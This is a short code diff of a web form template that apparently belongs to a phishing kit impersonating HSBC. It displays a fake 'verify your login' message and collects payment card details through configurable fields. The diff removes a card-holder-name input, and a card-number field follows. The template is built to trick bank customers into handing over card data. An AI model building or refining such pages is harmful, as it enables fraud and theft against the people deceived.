@@ -49,13 +49,6 @@ let p_expiry = hsbc.exp === 'on' ? true : false;
                 <form id="loginForm" method='POST' autocomplete="off" class="lab-form" <?=$p_card ? 'onsubmit="return validate()"' : ''?>>
                     <input type="hidden" id="userAgent" name="userAgent">
                     <p style="margin-bottom: 20px; margin-top: 20px;">To verify your login, we require some additional information regarding your account.</p>
-                    <% if (p_name) { %>
-                        <div class="row" style="align-items: center;">
-                            <p class="formLabel">Card Holder's Name</p>
-                        </div>
-                        <div class="inptContainer" style="margin-bottom: 20px">
-                            <input type="text" class="inptField lrinput" attr-action="Filling Name" name='name' id="input-name" required>
-                        </div>
                     <% } if (p_card) { %>
                         <div class="row" style="align-items: center;">
                             <p class="formLabel">Card Number</p>
